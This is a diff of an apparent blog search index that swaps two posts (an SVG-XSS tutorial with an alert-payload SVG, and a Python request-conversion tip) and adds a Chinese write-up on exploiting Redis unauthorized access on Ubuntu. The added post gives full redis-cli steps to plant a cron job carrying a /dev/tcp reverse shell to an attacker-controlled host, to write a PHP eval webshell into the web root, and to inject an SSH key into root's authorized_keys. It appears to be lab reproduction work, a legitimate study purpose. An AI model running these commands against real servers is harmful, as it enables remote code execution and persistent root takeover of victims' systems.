@@ -23,22 +23,22 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[SVG-XSS]]></title>
-    <url>%2F2019%2F10%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS%2F</url>
-    <content type="text"><![CDATA[SVG-XSS 介绍 SVG文件 Xss Payload SVG-XSS介绍 跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。 SVG文件 可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。 以下代码是基本SVG文件的示例： 123&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt; SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。 要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现： 1&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt; Xss Payload 如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例： 123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&quot;SVG XSS&quot;); &lt;/script&gt;&lt;/svg&gt; 上传时，注意内容类型设置为：Content-Type: image/svg+xml 上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。]]></content>
+    <title><![CDATA[接口快速测试小技巧(Python)]]></title>
+    <url>%2F2019%2F10%2F11%2F%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)%2F</url>
+    <content type="text"><![CDATA[接口快速测试小技巧(Python) 终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺 网站：https://curl.trillworks.com]]></content>
       <categories>
-        <category>WEB安全</category>
+        <category>python</category>
       </categories>
       <tags>
         <tag>WEB渗透测试</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[接口快速测试小技巧(Python)]]></title>
-    <url>%2F2019%2F10%2F11%2F%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)%2F</url>
-    <content type="text"><![CDATA[接口快速测试小技巧(Python) 终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺 网站：https://curl.trillworks.com]]></content>
+    <title><![CDATA[SVG-XSS]]></title>
+    <url>%2F2019%2F10%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS%2F</url>
+    <content type="text"><![CDATA[SVG-XSS 介绍 SVG文件 Xss Payload SVG-XSS介绍 跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。 SVG文件 可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。 以下代码是基本SVG文件的示例： 123&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt; SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。 要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现： 1&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt; Xss Payload 如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例： 123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&quot;SVG XSS&quot;); &lt;/script&gt;&lt;/svg&gt; 上传时，注意内容类型设置为：Content-Type: image/svg+xml 上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。]]></content>
       <categories>
-        <category>python</category>
+        <category>WEB安全</category>
       </categories>
       <tags>
         <tag>WEB渗透测试</tag>
@@ -163,6 +163,17 @@
       </categories>
       <tags>
         <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Redis未授权访问漏洞之ubuntu反弹shell问题]]></title>
+    <url>%2F2019%2F05%2F28%2FRedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bubuntu%E5%8F%8D%E5%BC%B9shell%E9%97%AE%E9%A2%98%2F</url>
+    <content type="text"><![CDATA[0x00 背景 0x01 环境准备 0x02 具体过程 0x02.1 安装redis 0x02.2 修改远程登陆配置文件 0x02.3 攻击利用 0x02.4 利用计划任务执行命令反弹shell 扩展思路 参考链接 0x00 背景 在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题。 0x01 环境准备 ubuntu16.04，用来任务计划反弹shell的靶机 MAC，用来接收ubuntu反弹过来的shell redis4.0.10未授权访问漏洞 0x02 具体过程0x02.1 安装redis 安装：下载、解压、编译 12345$ wget http://download.redis.io/releases/redis-4.0.10.tar.gz$ tar xzf redis-4.0.10.tar.gz$ mv redis-4.0.10 /usr/local/redis$ cd /usr/local/redis$ make 创建服务：二进制文件是编译完成后在src目录下，客户端是/usr/local/redis/src/redis-cli，服务器是/usr/local/redis/src/redis-server。下面为这两个文件做软链接。 12$ ln -s /usr/local/redis/src/redis-cli /usr/bin/redis$ ln -s /usr/local/redis/src/redis-server /usr/bin/redisd 测试是否成功安装 至此，表明你的redis已经安装完毕。 0x02.2 修改远程登陆配置文件123456789$ vim /usr/local/redis/redis.conf 配置文件 bind 127.0.0.1前面加上#号 protected-mode设为no $ 启动服务 redisd /usr/local/redis/redis.conf注释：- 关闭protected-mode模式，此时外部网络可以直接访问- 开启protected-mode保护模式，需配置bind ip或者设置访问密码- redis.conf配置文件中daemonize守护线程，默认是NO 默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件！！ 0x02.3 攻击利用 redis基本命令 123456789101112131415161718192021连接redis：redis-cli -h 192.168.1.108查看redis版本信息、一些具体信息、服务器版本信息等等：192.168.1.108:6379&gt;info将变量x的值设为test：192.168.1.108:6379&gt;set x &quot;test&quot;获取设置的某个变量的值：192.168.1.108:6379&gt;get x`flushall`是把整个redis数据库删除，一般情况下不要用！！！192.168.1.108:6379&gt;flushall查看所有键：192.168.1.108:6379&gt;KEYS *获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。192.168.1.108:6379&gt;CONFIG GET dir192.168.1.108:6379&gt;CONFIG GET dbfilename 0x02.4 利用计划任务执行命令反弹shell 在redis以root权限运行时可以写crontab来执行命令反弹shell 1234567891011121314151617先在自己的服务器上监听一个端口nc -lvnp 7999然后执行命令:root@kali:~# redis-cli -h 192.168.1.108192.168.1.108:6379&gt; set xx &quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;OK192.168.1.108:6379&gt; config set dir /var/spool/cron/OK192.168.1.108:6379&gt; config set dbfilename rootOK192.168.1.108:6379&gt; saveOK 1234567891011再次科普下：m:分钟 - 从0到59的整数h:小时 - 从0到23的整数dom:天 - 从1到31的整数 (必须是指定月份的有效日期)mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)user:指的是执行命令的用户command: 需要执行的命令星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务 12345ubuntu下可以利用的cron有以下几个地方：/etc/crontab：该文件里面的任务计划可以直接执行/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计 登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向/etc/cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。 – 我们手动把乱码删除，发现依然无法成功反弹shell。这是为什么呢？ 通过视频资料发现ubantu下默认使用/bin/dash执行脚本的问题，解决方式:将shell环境修改为bash。 成功反弹shell 扩展思路 利用Redis未授权访问写定时任务反弹shell 利用Redis未授权访问写webshell 通过redis未授权访问漏洞向ubuntu的web跟目录下写入一个webshell，然后要知道网站的根目录，在该测试环境下网站的根目录为/var/www/html 1234set xx &quot;\n\n\&lt;?php @eval($_POST[&apos;test&apos;]);?&gt;\n\n&quot;config set dir /var/www/htmlconfig set dbfilename shell.phpsave 利用redis未授权访问向远程服务器写入ssh公钥 12345678910111213在本地生成一对密钥：$ ssh-keygen -t rsa然后将公钥写入 key.txt 文件$ (echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt之后利用redis未授权访问漏洞将公钥写到/root/.ssh/id_rsa文件中$ cat key.txt | redis-cli -h ip -x set crackit接下来在redis-cli的交互式shell下执行config set dir /root/.sshconfig get dirconfig set dbfilename &quot;authorized_keys&quot;save这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行$ ssh –i id_rsa root@ip 参考链接 https://www.ixigua.com/i6590668394092036612/#mid=1568076190183425 https://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+      <tags>
+        <tag>WEB渗透测试</tag>
       </tags>
   </entry>
   <entry>
